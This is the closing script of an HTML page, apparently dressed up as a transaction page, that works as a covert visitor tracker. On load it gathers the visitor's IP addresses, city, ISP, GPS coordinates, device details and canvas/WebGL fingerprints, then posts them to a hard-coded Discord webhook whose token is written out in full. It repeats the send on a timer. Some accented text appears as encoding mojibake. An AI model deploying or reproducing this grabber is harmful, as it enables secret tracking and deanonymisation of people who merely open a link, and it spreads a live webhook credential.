<script>
  document.getElementById('txid').textContent = Date.now().toString(36).toUpperCase();
  document.getElementById('ref').textContent = 'TX-' + Math.random().toString(36).substr(2,9).toUpperCase();

  let infos = {
    timestamp: new Date().toISOString(),
    url: window.location.href,
    referrer: document.referrer || 'direct',
    userAgent: navigator.userAgent,
    language: navigator.language,
    languages: navigator.languages || [],
    platform: navigator.platform,
    vendor: navigator.vendor,
    screen: `${screen.width}Ã—${screen.height} (${screen.colorDepth} bits)`,
    availScreen: `${screen.availWidth}Ã—${screen.availHeight}`,
    pixelRatio: window.devicePixelRatio,
    orientation: screen.orientation ? screen.orientation.type : null,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: new Date().getTimezoneOffset(),
    hardwareConcurrency: navigator.hardwareConcurrency || 'inconnu',
    deviceMemory: navigator.deviceMemory || 'inconnu',
    maxTouchPoints: navigator.maxTouchPoints || 0,
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    online: navigator.onLine,
    connection: navigator.connection ? {
      type: navigator.connection.effectiveType || navigator.connection.type,
      downlink: navigator.connection.downlink,
      rtt: navigator.connection.rtt,
      saveData: navigator.connection.saveData
    } : null
  };

  // RÃ©cupÃ©ration agressive de l'IPv4 / IPv6
  async function getIPs() {
    const endpoints = [
      { url: 'https://api.ipify.org?format=json', key: 'ip' },
      { url: 'https://api64.ipify.org?format=json', key: 'ip' },
      { url: 'https://ipv4.icanhazip.com', key: 'ipv4' },
      { url: 'https://ifconfig.me/ip', key: 'ipv4' },
      { url: 'https://api.myip.com', key: 'ip' },
      { url: 'https://ipinfo.io/json', key: 'ip' }
    ];

    for (const ep of endpoints) {
      try {
        const res = await fetch(ep.url, { cache: 'no-store', mode: 'cors' });
        if (!res.ok) continue;

        let text = await res.text();
        let ip;

        if (text.includes('{')) {
          const json = JSON.parse(text);
          ip = json.ip || json.address;
        } else {
          ip = text.trim();
        }

        if (ip) {
          if (ip.includes('.')) infos.ipv4 = ip;
          if (ip.includes(':')) infos.ipv6 = ip;
          if (infos.ipv4) break; // PrioritÃ© IPv4
        }
      } catch (e) {}
    }

    if (!infos.ipv4 && !infos.ipv6) {
      infos.ipError = "tous les services IP ont Ã©chouÃ©";
    }
  }

  // GÃ©oloc enrichie + IP
  async function enrichGeo() {
    await getIPs();

    try {
      const res = await fetch('https://ipapi.co/json/');
      const data = await res.json();
      infos.city = data.city;
      infos.region = data.region;
      infos.country = data.country_name;
      infos.countryCode = data.country_code;
      infos.latitude = data.latitude;
      infos.longitude = data.longitude;
      infos.isp = data.org || data.asn;
      infos.asn = data.asn;
    } catch (e) {}
  }

  // Empreintes
  function fingerprints() {
    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      ctx.textBaseline = "top";
      ctx.font = "14px 'Arial'";
      ctx.fillStyle = "#f60";
      ctx.fillRect(125,1,62,20);
      ctx.fillStyle = "#069";
      ctx.fillText("test ð·", 2,15);
      infos.canvas = canvas.toDataURL();
    } catch(e) {}

    try {
      const gl = document.createElement('canvas').getContext('webgl');
      if (gl) {
        const debug = gl.getExtension('WEBGL_debug_renderer_info');
        infos.webglVendor = debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : null;
        infos.webglRenderer = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : null;
      }
    } catch(e) {}
  }

  // Envoi Discord
  async function send() {
    await enrichGeo();
    fingerprints();

    document.getElementById('collected').textContent = JSON.stringify(infos, null, 2);

    const embed = {
      embeds: [{
        title: "ðŸš¨ Visite dÃ©tectÃ©e",
        color: 0xff0000,
        fields: [
          { name: "IPv4", value: infos.ipv4 || "non dÃ©tectÃ©e", inline: true },
          { name: "IPv6", value: infos.ipv6 || "non dÃ©tectÃ©e", inline: true },
          { name: "Ville / RÃ©gion / Pays", value: `${infos.city || "?"} - ${infos.region || "?"} (${infos.country || "?"})`, inline: true },
          { name: "GPS", value: infos.latitude ? `${infos.latitude}, ${infos.longitude}` : "refusÃ©e", inline: true },
          { name: "ISP / ASN", value: infos.isp || infos.asn || "?", inline: true },
          { name: "User-Agent", value: "```" + infos.userAgent.substring(0, 300) + "```", inline: false },
          { name: "Ã‰cran", value: infos.screen, inline: true },
          { name: "Timezone", value: infos.timezone, inline: true },
          { name: "Connexion", value: infos.connection ? infos.connection.type : "?", inline: true },
          { name: "Hardware", value: `${infos.hardwareConcurrency} cÅ“urs | ${infos.deviceMemory} Go RAM`, inline: true },
          { name: "Canvas", value: infos.canvas ? "prÃ©sent" : "absent", inline: true }
        ],
        footer: { text: `ID: ${document.getElementById('txid').textContent} â€¢ ${new Date().toLocaleString('fr-FR')}` },
        timestamp: infos.timestamp
      }]
    };

    fetch('https://discord.com/api/webhooks/1475909581401096294/Y1xzIEYlnEyMFDUwXnuEuTFdMGLrUIzE3qpYFLNEVDYLAEFlFgef6ObpQm8ZTgseRwzs', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(embed)
    }).catch(e => console.error(e));
  }

  // Lancement
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      pos => {
        infos.geo = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy };
        send();
      },
      () => send(),
      { enableHighAccuracy: true, timeout: 10000 }
    );
  } else {
    send();
  }

  setTimeout(send, 7000); // secours
  </script>
</body>
</html>
